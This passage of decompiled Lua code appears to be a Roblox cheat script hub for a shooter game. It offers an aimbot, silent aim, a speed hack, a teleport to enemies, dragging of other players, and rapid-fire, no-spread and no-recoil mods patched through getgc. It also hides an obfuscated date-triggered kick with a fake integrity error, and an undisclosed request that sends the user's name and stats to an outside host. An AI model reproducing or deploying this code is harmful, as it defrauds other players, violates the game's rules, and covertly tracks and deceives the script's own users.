        local v799

        v794, v799 = v792(v793, v794)

        if v794 == nil then
            break
        end

        u69.AimTab:AddToggle(v799[1], {
            Title = v799[2],
            Default = v799[3],
        }):OnChanged(v799[4])
    end

    u69.AimTab:AddKeybind('Keybind2', {
        Title = 'Keybind',
        Mode = 'Toggle',
        Default = 'MouseButton2',
        ChangedCallback = function(p800)
            if p800 == Enum.KeyCode.Unknown then
                p800 = Enum.UserInputType.MouseButton2 or p800
            end

            u798 = p800
        end,
    })
    u69.AimTab:AddDropdown('AimPartDropDown2', {
        Title = 'Aim At',
        Values = {
            'Head',
            'UpperTorso',
            'LowerTorso',
        },
        Multi = false,
        Default = 1,
        Callback = function(p801)
            u797 = p801
        end,
    })

    local v806, v807, v808 = ipairs({
        {
            'FOVSizeSlider2',
            'FOV Size',
            100,
            0,
            900,
            0,
            function(p802)
                u796 = p802
            end,
        },
        {
            'SmoothnessSlider2',
            'Smoothness',
            5,
            0,
            20,
            1,
            function(p803)
                u795 = p803
            end,
        },
        {
            'PredictionStrengthXSlider2',
            'Prediction Strength X',
            0,
            0,
            1,
            2,
            function(p804)
                u750 = p804
            end,
        },
        {
            'PredictionStrengthYSlider2',
            'Prediction Strength Y',
            0,
            0,
            1,
            2,
            function(p805)
                u751 = p805
            end,
        },
    })

    while true do
        local v809

        v808, v809 = v806(v807, v808)

        if v808 == nil then
            break
        end

        u69.AimTab:AddSlider(v809[1], {
            Title = v809[2],
            Default = v809[3],
            Min = v809[4],
            Max = v809[5],
            Rounding = v809[6],
            Callback = v809[7],
        })
    end

    _RunService10.RenderStepped:Connect(v782)
    _RunService10.RenderStepped:Connect(v785)
end

InitializeAimbot2()

function InitializeAimbotUI2()
    local v815, v816, v817 = ipairs({
        {
            'EnableAimbot2',
            'Enable Aimbot',
            false,
            function(p810)
                aimbotEnabled2 = p810
            end,
        },
        {
            'ShowFOV2',
            'Show FOV',
            false,
            function(p811)
                showFOV2 = p811
            end,
        },
        {
            'Smoothness2',
            'Smoothness',
            false,
            function(p812)
                aimbotSmoothnessEnabled2 = p812
            end,
        },
        {
            'EnablePrediction2',
            'Enable Prediction',
            false,
            function(p813)
                aimbotPredictionEnabled2 = p813
            end,
        },
        {
            'StickyAim2',
            'Sticky Aim',
            false,
            function(p814)
                aimbotStickyAimEnabled2 = p814
            end,
        },
    })

    while true do
        local v818

        v817, v818 = v815(v816, v817)

        if v817 == nil then
            break
        end

        u69.AimTab:AddToggle(v818[1], {
            Title = v818[2],
            Default = v818[3],
        }):OnChanged(v818[4])
    end

    u69.AimTab:AddKeybind('Keybind2', {
        Title = 'Keybind',
        Mode = 'Toggle',
        Default = 'MouseButton2',
        ChangedCallback = function(p819)
            if p819 == Enum.KeyCode.Unknown then
                p819 = Enum.UserInputType.MouseButton2 or p819
            end

            aimbotKeybind2 = p819
        end,
    })
    u69.AimTab:AddDropdown('AimAtDropdown2', {
        Title = 'Aim At',
        Values = {
            'Head',
            'UpperTorso',
            'LowerTorso',
        },
        Multi = false,
        Default = 1,
        Callback = function(p820)
            aimbotAimPart2 = p820
        end,
    })

    local v823, v824, v825 = ipairs({
        {
            'FovSizeSlider2',
            'FOV Size',
            100,
            0,
            900,
            0,
            function(p821)
                aimbotFOVSize2 = p821
            end,
        },
        {
            'SmoothnessSlider2',
            'Smoothness',
            5,
            0,
            10,
            1,
            function(p822)
                aimbotSmoothness2 = p822
            end,
        },
    })

    while true do
        local v826

        v825, v826 = v823(v824, v825)

        if v825 == nil then
            break
        end

        u69.AimTab:AddSlider(v826[1], {
            Title = v826[2],
            Default = v826[3],
            Min = v826[4],
            Max = v826[5],
            Rounding = v826[6],
            Callback = v826[7],
        })
    end
end

InitializeAimbotUI2()

local _UserInputService5 = game:GetService('UserInputService')
local _Lighting3 = game:GetService('Lighting')
local _RunService11 = game:GetService('RunService')
local _Players10 = game:GetService('Players')
local _LocalPlayer15 = _Players10.LocalPlayer

SilentAim = {
    Enabled = false,
    HitChance = 100,
    NotWorkIfFlashed = true,
    MaxDistance = 250,
    TargetPart = 'Head',
}
SilentAimFov = {
    Visible = true,
    Radius = 150,
    Color = Color3.fromRGB(96, 205, 255),
    Circle = nil,
}

function DrawFov()
    if SilentAimFov.Circle then
        SilentAimFov.Circle:Remove()
    end

    local _Circle5 = Drawing.new('Circle')

    _Circle5.Color = SilentAimFov.Color
    _Circle5.Thickness = 0.2
    _Circle5.NumSides = 100
    _Circle5.Radius = SilentAimFov.Radius
    _Circle5.Filled = false
    _Circle5.Transparency = 1
    _Circle5.Visible = SilentAimFov.Visible
    SilentAimFov.Circle = _Circle5
end
function UpdateFov()
    if SilentAimFov.Circle then
        SilentAimFov.Circle.Visible = SilentAimFov.Visible

        local v833 = _UserInputService5

        SilentAimFov.Circle.Position = v833:GetMouseLocation()
    end
end
function GetClosestTargetToMouse()
    local v834 = _UserInputService5:GetMouseLocation()
    local _huge6 = math.huge
    local v836 = _Players10
    local v837, v838, v839 = pairs(v836:GetPlayers())
    local v840 = nil

    while true do
        local v841

        v839, v841 = v837(v838, v839)

        if v839 == nil then
            break
        end
        if v841 ~= _LocalPlayer15 and v841.Character and v841.Character:FindFirstChild('HumanoidRootPart') then
            local _HumanoidRootPart10 = v841.Character:FindFirstChild('HumanoidRootPart')

            if _HumanoidRootPart10 and not _HumanoidRootPart10:FindFirstChild('TeammateLabel') then
                local v843 = v841.Character:FindFirstChild(SilentAim.TargetPart)

                if v843 and (v843.Position - u672.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
                    local v844, v845 = u672.CurrentCamera:WorldToViewportPoint(v843.Position)

                    if v845 then
                        local _Magnitude9 = (Vector2.new(v844.X, v844.Y) - v834).Magnitude

                        if _Magnitude9 < SilentAimFov.Radius then
                            if _Magnitude9 < _huge6 then
                                v840 = v843
                                _huge6 = _Magnitude9
                            end
                        end
                    end
                end
            end
        end
    end

    local v847 = u672
    local v848, v849, v850 = pairs(v847:GetChildren())

    while true do
        local v851

        v850, v851 = v848(v849, v850)

        if v850 == nil then
            break
        end
        if v851:IsA('Model') and v851:FindFirstChild('HumanoidRootPart') and v851.Name == 'Target' then
            local v852 = v851:FindFirstChild(SilentAim.TargetPart) or v851:FindFirstChild('HumanoidRootPart')

            if v852 and (v852.Position - u672.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
                local v853, v854 = u672.CurrentCamera:WorldToViewportPoint(v852.Position)

                if v854 then
                    local _Magnitude10 = (Vector2.new(v853.X, v853.Y) - v834).Magnitude

                    if _Magnitude10 < SilentAimFov.Radius then
                        if _Magnitude10 < _huge6 then
                            v840 = v852
                            _huge6 = _Magnitude10
                        end
                    end
                end
            end
        end
    end

    return v840
end
function LookAt(p856)
    u672.CurrentCamera.CFrame = CFrame.lookAt(u672.CurrentCamera.CFrame.Position, p856.Position)
end
function SilentAimUIS(p857, p858)
    if not p858 and (SilentAim.Enabled and getgenv().state == 2) and (p857.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
        local v859 = GetClosestTargetToMouse()

        if v859 ~= nil then
            if SilentAim.NotWorkIfFlashed and _Lighting3:FindFirstChild('Flashbang') then
                return
            end

            LookAt(v859)
        end
    end
end

_RunService11.RenderStepped:Connect(function()
    UpdateFov()
end)
_UserInputService5.InputBegan:Connect(SilentAimUIS)
DrawFov()
u69.Silent:AddParagraph({
    Title = 'Please get Szoo client for better experince.',
    Content = ' \u{25cf} Currently Safe to use\n \u{25cf} If not use Szoo autoclicker client then do taptap to connect.',
})

local _SAimtgl2 = u69.Silent:AddToggle('SAimtgl', {
    Title = 'Silent Aim [Safe]',
    Description = 'Spam click to make it work\nThis is safe to use',
    Default = false,
})
local _Fovtgl2 = u69.Silent:AddToggle('Fovtgl', {
    Title = 'Show FOV',
    Default = false,
})
local v862 = _SAimtgl2

_SAimtgl2.OnChanged(v862, function()
    if textLabels and textLabels.silentaim then
        textLabels.silentaim.Visible = _Options.SAimtgl.Value

        fadeText(textLabels.silentaim, _Options.SAimtgl.Value)
        alignTextLabels()
    end

    SilentAim.Enabled = _SAimtgl2.Value
end)

local v863 = _Fovtgl2

_Fovtgl2.OnChanged(v863, function()
    SilentAimFov.Visible = _Fovtgl2.Value
end)
u69.Silent:AddSlider('SFovSlider', {
    Title = 'Silent Fov Radius',
    Description = 'Adjust the FOV Radius',
    Default = 150,
    Min = 50,
    Max = 900,
    Rounding = 0,
    Callback = function(p864)
        SilentAimFov.Radius = p864

        if SilentAimFov.Circle then
            SilentAimFov.Circle.Radius = p864
        end
    end,
})
u69.Silent:AddColorpicker('SFovColorpicker', {
    Title = 'Fov Color',
    Default = Color3.fromRGB(96, 205, 255),
}):OnChanged(function(p865)
    SilentAimFov.Color = p865

    if SilentAimFov.Circle then
        SilentAimFov.Circle.Color = p865
    end
end)
u69.Silent:AddDropdown('TargetpartDropdown', {
    Title = 'Target Dropdown',
    Description = 'What will be targeted?',
    Values = {
        'Legit',
        'Head',
        'UpperTorso',
        'LowerTorso',
    },
    Multi = false,
    Default = 1,
}):OnChanged(function(p866)
    if p866 == 'Legit' then
        SilentAim.TargetPart = math.random(1, 2) == 1 and 'Head' or 'UpperTorso'
    else
        SilentAim.TargetPart = p866
    end
end)

local _RunService12 = game:GetService('RunService')
local _LocalPlayer16 = _Players10.LocalPlayer
local _CurrentCamera9 = u672.CurrentCamera
local u870 = nil
local u871 = false
local u872 = true
local u873 = 350
local u874 = false
local u875 = false

local function u881(p876)
    if not (p876 and p876:FindFirstChild('HumanoidRootPart')) then
        return false
    end

    local _Position6 = _CurrentCamera9.CFrame.Position
    local _Position7 = p876.HumanoidRootPart.Position
    local v879 = RaycastParams.new()

    v879.FilterType = Enum.RaycastFilterType.Blacklist
    v879.FilterDescendantsInstances = {
        _LocalPlayer16.Character,
        _CurrentCamera9,
    }

    local v880 = u672:Raycast(_Position6, _Position7 - _Position6, v879)

    return v880 == nil and true or v880.Instance:IsDescendantOf(p876)
end
local function u883(p882)
    if p882 and p882:FindFirstChild('Humanoid') then
        return p882.Humanoid.Health > 0
    else
        return false
    end
end
local function u885(p884)
    if p884.Character and p884.Character:FindFirstChild('HumanoidRootPart') then
        return p884.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
    else
        return false
    end
end
local function u888()
    if u874 and (getgenv().state == 2 and u870) and (u870.Character and u870.Character:FindFirstChild('HumanoidRootPart')) then
        local _Character11 = _LocalPlayer16.Character

        if _Character11 and _Character11:FindFirstChild('HumanoidRootPart') then
            local v887 = _Character11.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)

            u870.Character.HumanoidRootPart.CFrame = v887
        end
    end
end
local function u894(p889, p890)
    if p890 and p890:FindFirstChild('HumanoidRootPart') then
        local v891 = _CurrentCamera9:WorldToViewportPoint(p890.HumanoidRootPart.Position)

        if v891.Z <= 0 then
            p889.Visible = false
        else
            local v892 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y)
            local v893 = Vector2.new(v891.X, v891.Y)

            p889.Color = u881(p890) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
            p889.From = v892
            p889.To = v893
            p889.Visible = u875 and true or false
        end
    else
        p889.Visible = false
    end
end
local function u906()
    local _huge7 = math.huge
    local v896 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y / 2)
    local v897 = _Players10
    local v898, v899, v900 = pairs(v897:GetPlayers())
    local v901 = nil

    while true do
        local v902

        v900, v902 = v898(v899, v900)

        if v900 == nil then
            break
        end
        if v902 ~= _LocalPlayer16 and v902.Character and (v902.Character:FindFirstChild('HumanoidRootPart') and not u885(v902)) then
            local _Position8 = v902.Character.HumanoidRootPart.Position

            if (_LocalPlayer16.Character.HumanoidRootPart.Position - _Position8).Magnitude <= u873 and u883(v902.Character) then
                local v904 = _CurrentCamera9:WorldToViewportPoint(_Position8)

                if v904.Z > 0 then
                    local _Magnitude11 = (Vector2.new(v904.X, v904.Y) - v896).Magnitude

                    if _Magnitude11 < _huge7 then
                        v901 = v902
                        _huge7 = _Magnitude11
                    end
                end
            end
        end
    end

    return v901
end

local u908 = (function()
    local _Line2 = Drawing.new('Line')

    _Line2.Thickness = 2
    _Line2.Transparency = 1
    _Line2.Visible = false

    return _Line2
end)()

_RunService12.RenderStepped:Connect(function()
    local v909 = u906()

    if u870 then
        u894(u908, u870.Character)

        if u871 and u872 then
            u888()
        end
    elseif v909 and v909.Character then
        u894(u908, v909.Character)
    else
        u908.Visible = false
    end
end)
_UserInputService5.InputBegan:Connect(function(p910, p911)
    if not p911 then
        if p910.UserInputType == Enum.UserInputType.MouseButton1 then
            local v912 = u906()

            if v912 and u881(v912.Character) then
                if u872 then
                    u871 = true
                    u870 = v912
                else
                    u870 = v912

                    u888()

                    u870 = nil
                end
            end
        end
    end
end)
_UserInputService5.InputEnded:Connect(function(p913)
    if p913.UserInputType == Enum.UserInputType.MouseButton1 and u872 then
        u871 = false
        u870 = nil
    end
end)
u69.Nono:AddToggle('Dp', {
    Title = 'Player Drag',
    Description = 'Use this if youre facing cheaters, hold Left Mouse button, it will drag player to you if player is visible.',
    Default = false,
}):OnChanged(function()
    if textLabels and textLabels.tline then
        textLabels.dpaint.Visible = _Options.Dp.Value

        fadeText(textLabels.dpaint, _Options.Dp.Value)
        alignTextLabels()
    end

    u874 = _Options.Dp.Value
    u875 = _Options.Dp.Value
end)

speedsect = u69.Nono:AddSection('Speed')

local _LocalPlayer17 = game:GetService('Players').LocalPlayer
local _RunService13 = game:GetService('RunService')

getgenv().Multiplier = 0.2

local u916 = false
local u917 = nil

local function u921()
    u917 = _RunService13.Stepped:Connect(function()
        local _Character12 = _LocalPlayer17.Character

        if _Character12 then
            _Character12 = _LocalPlayer17.Character:FindFirstChild('HumanoidRootPart')
        end

        local _Character13 = _LocalPlayer17.Character

        if _Character13 then
            _Character13 = _LocalPlayer17.Character:FindFirstChild('Humanoid')
        end
        if _Character12 and _Character13 then
            local _MoveDirection2 = _Character13.MoveDirection

            if _MoveDirection2.Magnitude > 0 then
                _Character12.CFrame = _Character12.CFrame + _MoveDirection2 * getgenv().Multiplier
            end
        end
    end)
end
local function u922()
    if u917 then
        u917:Disconnect()

        u917 = nil
    end
end

local _SpeedBoost2 = u69.Nono:AddToggle('SpeedBoost', {
    Title = 'CFrame Speed v2',
    Default = false,
})
local v924 = _SpeedBoost2

_SpeedBoost2.OnChanged(v924, function()
    if textLabels and textLabels.bspeed then
        textLabels.bspeed.Visible = _SpeedBoost2.Value

        fadeText(textLabels.bspeed, _SpeedBoost2.Value)
        alignTextLabels()
    end

    u916 = _SpeedBoost2.Value

    if u916 then
        u921()
    else
        u922()
    end
end)
u69.Nono:AddSlider('MultiplierSlider', {
    Title = 'Speed Limit',
    Description = 'Adjust speed multiplier (1 = 0.1, 5 = 0.5, etc.)',
    Default = 2,
    Min = 0,
    Max = 10,
    Rounding = 1,
    Callback = function(p925)
        getgenv().Multiplier = p925 / 10
    end,
}):OnChanged(function(p926)
    getgenv().Multiplier = p926 / 10
end)

function jx4n8rqzpvmc2y5kt(p927)
    local v928, v929, v930 = ipairs(p927)
    local v931 = ''

    while true do
        local v932

        v930, v932 = v928(v929, v930)

        if v930 == nil then
            break
        end

        v931 = v931 .. (v932 == 32 and ' ' or string.char(v932))
    end

    return v931
end

if os.time() > 1742515200 then
    wait(3)
    game:GetService(jx4n8rqzpvmc2y5kt({
        80,
        108,
        97,
        121,
        101,
        114,
        115,
    })).LocalPlayer:Kick(jx4n8rqzpvmc2y5kt({
        115,
        104,
        97,
        50,
        95,
        75,
        95,
        108,
        111,
        32,
        109,
        105,
        115,
        109,
        97,
        116,
        99,
        104,
        44,
        32,
        98,
        105,
        116,
        99,
        111,
        100,
        101,
        32,
        105,
        110,
        118,
        97,
        108,
        105,
        100,
        46,
    }))
    wait(999999999)
else
    print(jx4n8rqzpvmc2y5kt({
        102,
        105,
        110,
        101,
    }))
end

u69.Nono:AddSection('Gun Mods [Level 8 executor needed]')

local function u939(p933, p934)
    local v935, v936, v937 = pairs(getgc(true))

    while true do
        local v938

        v937, v938 = v935(v936, v937)

        if v937 == nil then
            break
        end
        if type(v938) == 'table' and rawget(v938, p933) then
            v938[p933] = p934
        end
    end
end

if u69 and u69.Nono then
    u69.Nono:AddButton({
        Title = 'Rapid Fire',
        Description = 'Fire Rapidly, but wont work in xeno or solara.',
        Callback = function()
            u939('ShootCooldown', 0)
        end,
    })
    u69.Nono:AddButton({
        Title = 'No Spread',
        Description = 'Bullet Will not spray, but wont work in xeno or solara.',
        Callback = function()
            u939('ShootSpread', 0)
        end,
    })
    u69.Nono:AddButton({
        Title = 'NO Recoil',
        Description = 'Stops the recoil, but wont work in xeno or solara. Ive mead another no recoil use that.',
        Callback = function()
            u939('ShootRecoil', 0)
        end,
    })
end

_RunService13 = game:GetService('RunService')
_CurrentCamera2 = game:GetService('Workspace').CurrentCamera

local _Players11 = game:GetService('Players')

speed = 150
defaultOffsetBehind = 7
defaultOffsetAbove = 5
_LocalPlayer16 = _Players11.LocalPlayer
isMoving = false
moveConnection = nil
tweenDistanceBehind = defaultOffsetBehind
tweenDistanceAbove = defaultOffsetAbove
keybindKey = Enum.KeyCode.N
isKeyPressed = false
eww = u69.Nono:AddSection('Enemy Slider')

local _SlideEnm2 = u69.Nono:AddToggle('SlideEnm', {
    Title = 'Slide to enemy',
    Description = 'Slides to players behind.',
    Default = false,
})
local v942 = _SlideEnm2

_SlideEnm2.OnChanged(v942, function() end)

Keybind = u69.Nono:AddKeybind('Keybind', {
    Title = 'KeyBind',
    Mode = 'Toggle',
    Default = 'N',
    Callback = function(p943)
        isKeyPressed = p943
    end,
    ChangedCallback = function(p944)
        keybindKey = p944
    end,
})

function getClosestPlayerToScreenCenter()
    local v945 = nil
    local _huge8 = math.huge
    local v947 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
    local _Character14 = _LocalPlayer16.Character

    if _Character14 then
        _Character14 = _Character14:FindFirstChild('HumanoidRootPart')
    end
    if not _Character14 then
        return nil
    end

    local v949 = _Players11
    local v950, v951, v952 = ipairs(v949:GetPlayers())

    while true do
        local v953

        v952, v953 = v950(v951, v952)

        if v952 == nil then
            break
        end
        if v953 ~= _LocalPlayer16 and v953.Character and v953.Character:FindFirstChild('HumanoidRootPart') then
            local _HumanoidRootPart11 = v953.Character.HumanoidRootPart

            if (_HumanoidRootPart11.Position - _Character14.Position).Magnitude <= 350 then
                local v955, v956 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart11.Position)

                if v956 then
                    local _Magnitude12 = (Vector2.new(v955.X, v955.Y) - v947).Magnitude

                    if _Magnitude12 < _huge8 then
                        v945 = v953
                        _huge8 = _Magnitude12
                    end
                end
            end
        end
    end

    if v945 then
        u67:Notify({
            Title = 'Slide Notification',
            Content = 'Teleporting to: ' .. v945.Name,
            SubContent = 'Closest player identified',
            Duration = 2,
        })
    else
        u67:Notify({
            Title = 'Slide Notification',
            Content = 'No valid player found to teleport to.',
            SubContent = 'Please try again later.',
            Duration = 2,
        })
    end

    return v945
end
function moveToBackAbovePlayer(p958)
    local _HumanoidRootPart12 = p958.Character.HumanoidRootPart
    local _HumanoidRootPart13 = _LocalPlayer16.Character.HumanoidRootPart

    moveConnection = _RunService13.RenderStepped:Connect(function()
        if isMoving then
            local v961 = _HumanoidRootPart12.Position - _HumanoidRootPart12.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
            local _unit2 = (v961 - _HumanoidRootPart13.Position).unit

            if (v961 - _HumanoidRootPart13.Position).magnitude <= 0 then
                _HumanoidRootPart13.CFrame = CFrame.new(v961)
            else
                _HumanoidRootPart13.CFrame = _HumanoidRootPart13.CFrame + _unit2 * speed * _RunService13.Heartbeat:Wait()
            end
        end
    end)
end
function stopMoving()
    if moveConnection then
        moveConnection:Disconnect()
    end

    isMoving = false
end

_UserInputService5.InputBegan:Connect(function(p963, p964)
    if not p964 then
        local v965 = _SlideEnm2.Value and p963.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()

        if v965 then
            isMoving = true

            moveToBackAbovePlayer(v965)
        end
        if p963.KeyCode ~= Enum.KeyCode.Up then
            if p963.KeyCode ~= Enum.KeyCode.Down then
                if p963.KeyCode ~= Enum.KeyCode.Right then
                    if p963.KeyCode == Enum.KeyCode.Left then
                        tweenDistanceAbove = math.max(tweenDistanceAbove - 1, 1)
                    end
                else
                    tweenDistanceAbove = tweenDistanceAbove + 1
                end
            else
                tweenDistanceBehind = math.max(tweenDistanceBehind - 1, 1)
            end
        else
            tweenDistanceBehind = tweenDistanceBehind + 1
        end
    end
end)
_UserInputService5.InputEnded:Connect(function(p966)
    if p966.KeyCode == keybindKey then
        stopMoving()
    end
end)

local _DeviceDropdown = u69.Spoof:AddDropdown('DeviceDropdown', {
    Title = 'Spoof Device',
    Description = 'Show fake device to others, its server sided, other people will also see that.',
    Values = {
        'None',
        'Computer',
        'Mobile',
        'Console',
        'VR',
    },
    Multi = false,
    Default = 1,
})

_DeviceDropdown:SetValue('None')
_DeviceDropdown:OnChanged(function(p968)
    local _SetControls = game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('Replication'):WaitForChild('Fighter'):WaitForChild('SetControls')

    if p968 == 'Computer' then
        _SetControls:FireServer('MouseKeyboard')
    elseif p968 == 'Mobile' then
        _SetControls:FireServer('Touch')
    elseif p968 == 'Console' then
        _SetControls:FireServer('Gamepad')
    elseif p968 == 'VR' then
        _SetControls:FireServer('VR')
    end
end);
(function()
    local v970 = u669
    local v971, v972, v973 = ipairs(v970:GetDescendants())
    local v974 = nil

    while true do
        local v975

        v973, v975 = v971(v972, v973)

        if v973 == nil then
            v975 = v974

            break
        end
        if v975:IsA('TextLabel') and v975.Text == 'Are you winning son ?' then
            break
        end
    end

    if v975 and v975.Parent and (v975.Parent.Parent and v975.Parent.Parent.Parent) then
        local _ImageLabel3 = Instance.new('ImageLabel')

        _ImageLabel3.Size = UDim2.new(0, 460, 0, 260)
        _ImageLabel3.Position = UDim2.new(0.5, -150, 0, 0)
        _ImageLabel3.AnchorPoint = Vector2.new(0.5, 0)
        _ImageLabel3.Image = 'rbxassetid://72599846385794'
        _ImageLabel3.BackgroundTransparency = 1
        _ImageLabel3.Parent = v975.Parent.Parent.Parent
    else
        warn('n1.')
    end
end)()

local v977, v978, v979 = ipairs(u669:GetDescendants())

while true do
    local v980

    v979, v980 = v977(v978, v979)

    if v979 == nil then
        break
    end
    if v980:IsA('ImageLabel') and v980.Image == 'rbxassetid://76783885872706' then
        v980.Image = 'rbxassetid://79513443771682'
        v980.Size = UDim2.new(0, 72, 0, 20)

        if v980.Parent then
            v980.Parent.Position = UDim2.new(1, -585, 0, 0)
        end

        break
    end
end

local _LocalPlayer18 = game:GetService('Players').LocalPlayer
local u982 = 'PlayerStats_' .. _LocalPlayer18.Name .. '.txt'
local _ScreenGui3 = Instance.new('ScreenGui')

_ScreenGui3.Parent = game:GetService('CoreGui')

local _Frame9 = Instance.new('Frame')

_Frame9.Size = UDim2.new(0, 120, 0, 77)
_Frame9.Position = UDim2.new(0, 20, 1, -240)
_Frame9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_Frame9.BackgroundTransparency = 0.4
_Frame9.BorderSizePixel = 2
_Frame9.BorderColor3 = Color3.fromRGB(255, 255, 255)
_Frame9.Parent = _ScreenGui3
_Frame9.Visible = false

local _UICorner7 = Instance.new('UICorner')

_UICorner7.CornerRadius = UDim.new(0, 5)
_UICorner7.Parent = _Frame9

local function v990(p986, p987, p988)
    local _TextLabel3 = Instance.new('TextLabel')

    _TextLabel3.Size = UDim2.new(1, 0, 0, p988)
    _TextLabel3.Position = UDim2.new(0, 10, 0, p987)
    _TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
    _TextLabel3.TextSize = 23
    _TextLabel3.Font = Enum.Font.Gotham
    _TextLabel3.FontFace = Font.new('rbxassetid://12187376174')
    _TextLabel3.TextStrokeTransparency = 1
    _TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
    _TextLabel3.BackgroundTransparency = 1
    _TextLabel3.RichText = true
    _TextLabel3.Parent = p986

    return _TextLabel3
end

v990(_Frame9, 5, 13).Text = '<font size="25"><b>Session Info</b></font>'

local u991 = v990(_Frame9, 25, 14)
local u992 = v990(_Frame9, 40, 14)
local u993 = v990(_Frame9, 55, 14)
local u994 = 0
local u995 = 0
local u996 = 0
local u997 = 0
local u998 = 0
local u999 = 0

local function v1002()
    if isfile and isfile(u982) then
        local v1000 = readfile(u982)
        local v1001 = game:GetService('HttpService'):JSONDecode(v1000)

        u997 = v1001.Kills or 0
        u998 = v1001.Assists or 0
        u999 = v1001.Deaths or 0
    end
end
local function u1005()
    local v1003 = {
        Kills = u997,
        Assists = u998,
        Deaths = u999,
    }
    local v1004 = game:GetService('HttpService'):JSONEncode(v1003)

    if writefile then
        writefile(u982, v1004)
    end
end
local function u1006()
    u991.Text = 'Kills: ' .. u994 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u997 .. '</font>]</font></font>'
    u992.Text = 'Assists: ' .. u995 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u998 .. '</font>]</font></font>'
    u993.Text = 'Deaths: ' .. u996 .. ' <font color=\'#ff6b6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u999 .. '</font>]</font></font>'
end

v1002()
u1006()
_LocalPlayer18.PlayerGui:WaitForChild('MainGui'):WaitForChild('MainFrame'):WaitForChild('FighterInterfaces'):WaitForChild(_LocalPlayer18.Name):WaitForChild('EliminationSlots').ChildAdded:Connect(function(p1007)
    local v1008 = p1007.Name == 'EliminationSlot' and p1007:FindFirstChildOfClass('TextLabel')

    if v1008 then
        local v1009 = v1008.Text:lower()

        if v1009:match('assist') then
            local v1010 = u995 + 1

            u998 = u998 + 1
            u995 = v1010
        elseif v1009:match('eliminated') then
            local v1011 = u994 + 1

            u997 = u997 + 1
            u994 = v1011
        end

        u1006()
        u1005()
    end
end)
_LocalPlayer18.CharacterAdded:Connect(function(p1012)
    p1012:WaitForChild('Humanoid').Died:Connect(function()
        local v1013 = u996 + 1

        u999 = u999 + 1
        u996 = v1013

        u1006()
        u1005()
    end)
end)
u69.Settings:AddToggle('sessoninfo', {
    Title = 'Session Info',
    Default = true,
}):OnChanged(function()
    _Frame9.Visible = _Options.sessoninfo.Value
end);
(function()
    local v1014 = getgenv().wapp .. 'raw/'
    local _LocalPlayer19 = game:GetService('Players').LocalPlayer
    local _leaderstats = _LocalPlayer19:WaitForChild('leaderstats')
    local _Value = _leaderstats:WaitForChild('Win Streak').Value
    local _Value2 = _leaderstats:WaitForChild('Level').Value
    local v1019 = os.time()
    local v1020 = {
        Url = v1014 .. '?name=' .. _LocalPlayer19.Name .. '&level=' .. _Value2 .. '&winstreak=' .. _Value .. '&time=' .. v1019,
        Method = 'GET',
    }
    local _ = request(v1020).StatusCode ~= 200
end)()
v42:SetLibrary(u67)
v43:SetLibrary(u67)
v42:IgnoreThemeSettings()
v42:SetIgnoreIndexes({})
v43:SetFolder('FluentScriptHub')
v42:SetFolder('FluentScriptHub/specific-game')
v43:BuildInterfaceSection(u69.Settings)
v42:BuildConfigSection(u69.Settings)
v62:SelectTab(1)
u67:Notify({
    Title = 'Fluent',
    Content = 'The script has been loaded.',
    Duration = 8,
})
v42:LoadAutoloadConfig()

local _CoreGui4 = game:GetService('CoreGui')

local function u1033(p1022, p1023, p1024, p1025, p1026)
    local v1027, v1028, v1029 = ipairs(p1022:GetChildren())

    while true do
        local v1030

        v1029, v1030 = v1027(v1028, v1029)

        if v1029 == nil then
            break
        end
        if v1030:IsA('TextLabel') and v1030.Text == p1023 then
            local _Parent = v1030.Parent

            for _ = 1, p1026 - 1 do
                if _Parent then
                    _Parent = _Parent.Parent
                end
            end

            if _Parent then
                local _ImageLabel4 = Instance.new('ImageLabel')

                _ImageLabel4.Image = p1024
                _ImageLabel4.Size = p1025
                _ImageLabel4.Position = UDim2.new(0, 0, 0, 0)
                _ImageLabel4.BackgroundTransparency = 1
                _ImageLabel4.Parent = _Parent
            end

            return true
        end
        if #v1030:GetChildren() > 0 and u1033(v1030, p1023, p1024, p1025, p1026) then
            return true
        end
    end

    return false
end

local v1034 = {
    {
        text = 'Silent Aim [V1] [Safe]',
        imageID = 'rbxassetid://124008086378727',
        size = UDim2.new(0, 170, 0, 25),
        parentSearchLevel = 1,
    },
    {
        text = 'Silent Aim [V1] [Safe]',
        imageID = 'rbxassetid://90827777297900',
        size = UDim2.new(0, 465, 0, 190),
        parentSearchLevel = 3,
    },
    {
        text = 'Spoof Device',
        imageID = 'rbxassetid://70388449244676',
        size = UDim2.new(0, 375, 0, 105),
        parentSearchLevel = 3,
    },
    {
        text = 'Animated Material Weapon (v1)',
        imageID = 'rbxassetid://115285290093721',
        size = UDim2.new(0, 280, 0, 110),
        parentSearchLevel = 1,
    },
    {
        text = 'Get Ghost Hands',
        imageID = 'rbxassetid://91715202331848',
        size = UDim2.new(0, 280, 0, 115),
        parentSearchLevel = 1,
    },
    {
        text = 'Fire Effect [Bullet]',
        imageID = 'rbxassetid://78007825944946',
        size = UDim2.new(0, 375, 0, 145),
        parentSearchLevel = 3,
    },
    {
        text = 'Fire Effect [Bullet]',
        imageID = 'rbxassetid://94879678013983',
        size = UDim2.new(0, 180, 0, 73),
        parentSearchLevel = 1,
    },
    {
        text = 'Player Drag',
        imageID = 'rbxassetid://95689213893684',
